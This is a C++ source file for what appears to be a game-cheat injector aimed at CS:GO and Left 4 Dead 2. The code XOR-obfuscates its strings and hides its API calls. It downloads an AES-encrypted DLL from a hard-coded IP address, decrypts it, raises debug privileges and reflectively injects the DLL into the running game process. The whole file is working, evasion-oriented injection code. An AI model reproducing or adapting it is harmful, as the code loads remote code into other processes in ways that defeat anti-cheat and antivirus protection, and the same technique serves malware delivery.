#include "main.h"




DWORD CInjection::GetProcessIdByName(LPCTSTR name)
{
	PROCESSENTRY32 pe32;
	HANDLE snapshot = NULL;
	DWORD pid = 0;

	snapshot = CreateToolhelp32SnapshotHidden(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE) { 
		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (Process32FirstHidden(snapshot, &pe32)) {
			do {
				std::string sName = pe32.szExeFile;
				std::transform(sName.begin(), sName.end(),sName.begin(), ::tolower);

				if (!lstrcmp(sName.c_str(), name)) {					
					pid = pe32.th32ProcessID;
					break;
				}
			} while (Process32NextHidden(snapshot, &pe32));
		}

		CloseHandleHidden(snapshot);
	}

	return pid;
}

VOID showError(char* pszError)
{
	MessageBoxHidden(0, pszError,/*Error*/XorStr<0x3B, 6, 0xB52E90E4>("\x7E\x4E\x4F\x51\x4D" + 0xB52E90E4).s, 0);	
}


VOID CInjection::doInject(char* pszSelected, char* pszProcess)
{	
	HANDLE hFile = NULL;
	HANDLE hModule = NULL;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	LPVOID lpBuffer = NULL;
	DWORD dwLength = 0;
	DWORD dwBytesRead = 0;
	DWORD dwProcessId = 0;
	TOKEN_PRIVILEGES priv = { 0 };
	
	std::string sFilePath;
	std::string sProcess;
	
	dwProcessId = GetProcessIdByName(pszProcess);

	if (strcmp(pszSelected, /*CS:GO*/XorStr<0xC0, 6, 0x2F0C09F0>("\x83\x92\xF8\x84\x8B" + 0x2F0C09F0).s) == 0)
	{
		sFilePath = /*_INTERWEBZ/csgo/_csgo.php*/XorStr<0x01, 26, 0x2430A169>("\x5E\x4B\x4D\x50\x40\x54\x50\x4D\x4B\x50\x24\x6F\x7E\x69\x60\x3F\x4E\x71\x60\x73\x7A\x38\x67\x70\x69" + 0x2430A169).s;
	}

	if (strcmp(pszSelected,/*L4D2*/XorStr<0x31, 5, 0x7E1A68FE>("\x7D\x06\x77\x06" + 0x7E1A68FE).s) == 0)
	{
		sFilePath = /*_INTERWEBZ/l4d2/l4d2injector.php*/XorStr<0x54, 33, 0x570A1383>("\x0B\x1C\x18\x03\x1D\x0B\x0D\x1E\x1E\x07\x71\x33\x54\x05\x50\x4C\x08\x51\x02\x55\x01\x07\x00\x0E\x0F\x19\x01\x1D\x5E\x01\x1A\x03" + 0x570A1383).s;
	}

	std::cout << sFilePath << std::endl;
	

	g_Winsock.InitWinsock();
	g_Winsock.Connect(/*37.187.236.54*/XorStr<0xDB, 14, 0x41843CD4>("\xE8\xEB\xF3\xEF\xE7\xD7\xCF\xD0\xD0\xD2\xCB\xD3\xD3" + 0x41843CD4).s);
	CString cstrResponse;
	g_Winsock.SendHttpGet(sFilePath.c_str() , cstrResponse);
	g_Winsock.Disconnect();
	g_Winsock.CleanUp();

	std::string sRet((LPCTSTR)cstrResponse);
			
	sDecrypted = Crypt::decrypt(sRet, aes_key, aes_iv);		

	SendMessageHidden(g_Globals.hProgress, PBM_STEPIT, 0, 0);	
	
	

	if (dwProcessId == 0x0)
		showError(/*No valid target process found*/XorStr<0x9D, 30, 0x2E484EDA>("\xD3\xF1\xBF\xD6\xC0\xCE\xCA\xC0\x85\xD2\xC6\xDA\xCE\xCF\xDF\x8C\xDD\xDC\xC0\xD3\xD4\xC1\xC0\x94\xD3\xD9\xC2\xD6\xDD" + 0x2E484EDA).s);
		
	dwLength = sDecrypted.size();
	if (dwLength == INVALID_FILE_SIZE || dwLength == 0)
		showError(/*Failed to get the DLL file size*/XorStr<0xD9, 32, 0x5AD84D50>("\x9F\xBB\xB2\xB0\xB8\xBA\xFF\x94\x8E\xC2\x84\x81\x91\xC6\x93\x80\x8C\xCA\xAF\xA0\xA1\xCE\x89\x99\x9D\x97\xD3\x87\x9C\x8C\x92" + 0x5AD84D50).s);
	lpBuffer = (char*)sDecrypted.c_str();
	if (!lpBuffer)
		showError(/*Failed to get the DLL file size*/XorStr<0xD9, 32, 0x5AD84D50>("\x9F\xBB\xB2\xB0\xB8\xBA\xFF\x94\x8E\xC2\x84\x81\x91\xC6\x93\x80\x8C\xCA\xAF\xA0\xA1\xCE\x89\x99\x9D\x97\xD3\x87\x9C\x8C\x92" + 0x5AD84D50).s);
	
	SendMessageHidden(g_Globals.hProgress, PBM_STEPIT, 0, 0);

	if (OpenProcessTokenHidden(GetCurrentProcessHidden(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (LookupprivilegeValueHidden(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			AdjustTokenPrivilegesHidden(hToken, FALSE, &priv, 0, NULL, NULL);
		CloseHandleHidden(hToken);
	}
		hProcess = OpenProcessHidden(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);

	if (!hProcess)
		showError(/*Failed to open the target process*/XorStr<0xCD, 34, 0x103A0870>("\x8B\xAF\xA6\xBC\xB4\xB6\xF3\xA0\xBA\xF6\xB8\xA8\xBC\xB4\xFB\xA8\xB5\xBB\xFF\x94\x80\x90\x84\x81\x91\xC6\x97\x9A\x86\x89\x8E\x9F\x9E" + 0x103A0870).s);

		SendMessageHidden(g_Globals.hProgress, PBM_STEPIT, 0, 0);
		
		hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);
	if (!hModule)
		showError(/*Failed to inject the DLL*/XorStr<0x31, 25, 0xFDF1264D>("\x77\x53\x5A\x58\x50\x52\x17\x4C\x56\x1A\x52\x52\x57\x5B\x5C\x34\x61\x36\x2B\x21\x65\x02\x0B\x04" + 0xFDF1264D).s);
	
	SendMessageHidden(g_Globals.hProgress, PBM_STEPIT, 0, 0);
		WaitForSingleObjectHidden(hModule, -1);
	
	/*if (lpBuffer)		
		HeapFreeHidden(GetProcessHeapHidden(), 0, lpBuffer);*/
	if (hProcess)
		CloseHandleHidden(hProcess);
	
	ExitProcessHidden(0);
}